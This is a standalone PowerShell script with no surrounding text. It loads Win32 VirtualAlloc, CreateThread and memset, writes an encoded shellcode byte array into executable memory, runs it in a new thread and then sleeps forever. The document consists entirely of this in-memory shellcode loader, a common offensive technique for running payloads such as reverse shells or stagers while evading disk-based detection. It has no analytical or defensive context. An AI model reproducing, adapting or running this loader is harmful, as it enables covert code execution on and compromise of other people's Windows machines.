$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x91,0xfc,0x7b,0xd6,0xdb,0xd8,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x5f,0x13,0x83,0xef,0xfc,0x03,0x5f,0x9e,0x1e,0x8e,0x2a,0x48,0x5c,0x71,0xd3,0x88,0x01,0xfb,0x36,0xb9,0x01,0x9f,0x33,0xe9,0xb1,0xeb,0x16,0x05,0x39,0xb9,0x82,0x9e,0x4f,0x16,0xa4,0x17,0xe5,0x40,0x8b,0xa8,0x56,0xb0,0x8a,0x2a,0xa5,0xe5,0x6c,0x13,0x66,0xf8,0x6d,0x54,0x9b,0xf1,0x3c,0x0d,0xd7,0xa4,0xd0,0x3a,0xad,0x74,0x5a,0x70,0x23,0xfd,0xbf,0xc0,0x42,0x2c,0x6e,0x5b,0x1d,0xee,0x90,0x88,0x15,0xa7,0x8a,0xcd,0x10,0x71,0x20,0x25,0xee,0x80,0xe0,0x74,0x0f,0x2e,0xcd,0xb9,0xe2,0x2e,0x09,0x7d,0x1d,0x45,0x63,0x7e,0xa0,0x5e,0xb0,0xfd,0x7e,0xea,0x23,0xa5,0xf5,0x4c,0x88,0x54,0xd9,0x0b,0x5b,0x5a,0x96,0x58,0x03,0x7e,0x29,0x8c,0x3f,0x7a,0xa2,0x33,0x90,0x0b,0xf0,0x17,0x34,0x50,0xa2,0x36,0x6d,0x3c,0x05,0x46,0x6d,0x9f,0xfa,0xe2,0xe5,0x0d,0xee,0x9e,0xa7,0x59,0xc3,0x92,0x57,0x99,0x4b,0xa4,0x24,0xab,0xd4,0x1e,0xa3,0x87,0x9d,0xb8,0x34,0xe8,0xb7,0x7d,0xaa,0x17,0x38,0x7e,0xe2,0xd3,0x6c,0x2e,0x9c,0xf2,0x0c,0xa5,0x5c,0xfb,0xd8,0x50,0x58,0x6b,0x23,0x0c,0x06,0x66,0xcb,0x4f,0xc7,0x66,0x6a,0xd9,0x21,0xc6,0x3c,0x89,0xfd,0xa6,0xec,0x69,0xae,0x4e,0xe7,0x65,0x91,0x6e,0x08,0xac,0xba,0x04,0xe7,0x19,0x92,0xb0,0x9e,0x03,0x68,0x21,0x5e,0x9e,0x14,0x61,0xd4,0x2d,0xe8,0x2f,0x1d,0x5b,0xfa,0xc7,0xed,0x16,0xa0,0x41,0xf1,0x8c,0xcf,0x6d,0x67,0x2b,0x46,0x3a,0x1f,0x31,0xbf,0x0c,0x80,0xca,0xea,0x07,0x09,0x5f,0x55,0x7f,0x76,0x8f,0x55,0x7f,0x20,0xc5,0x55,0x17,0x94,0xbd,0x05,0x02,0xdb,0x6b,0x3a,0x9f,0x4e,0x94,0x6b,0x4c,0xd8,0xfc,0x91,0xab,0x2e,0xa3,0x6a,0x9e,0xae,0x9f,0xbc,0xe6,0xc4,0xf1,0x7c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};